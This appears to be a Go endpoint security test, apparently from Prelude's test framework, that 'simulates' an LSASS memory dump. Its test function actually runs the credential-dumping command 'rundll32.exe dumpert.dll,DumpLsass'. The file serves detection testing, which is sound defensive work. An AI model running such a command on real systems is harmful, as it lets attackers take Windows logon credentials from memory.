/*
ID: f2f46686-6f3c-4724-bd7d-24e31c70f98f
NAME: LSASS Memory Dump Creation
CREATED: 2024-06-29
scenario: creating memdump using `rundll32.exe` + `dumpert.dll`
*/

package main

import (
	_ "embed"
	"os/exec"
	"runtime"
	"time"

	Endpoint "github.com/preludeorg/test/endpoint"
)

var supported = map[string][]string{
	"windows": {"cmd.exe", "/C", "echo Simulating LSASS memory dump creation"},
}

func test() {
	Endpoint.Say("[+] Simulating LSASS memory dump creation")

	// Simulate LSASS memory dump creation
	cmd := exec.Command("cmd.exe", "/C", "rundll32.exe dumpert.dll,DumpLsass")
	err := cmd.Run()
	if err != nil {
		Endpoint.Say("[-] Failed to simulate LSASS memory dump creation: " + err.Error())
		Endpoint.Stop(101)
		return
	}

	Endpoint.Say("[+] LSASS memory dump successfully created")
	Endpoint.Stop(100)
}

func main() {
	Endpoint.Start(test)
}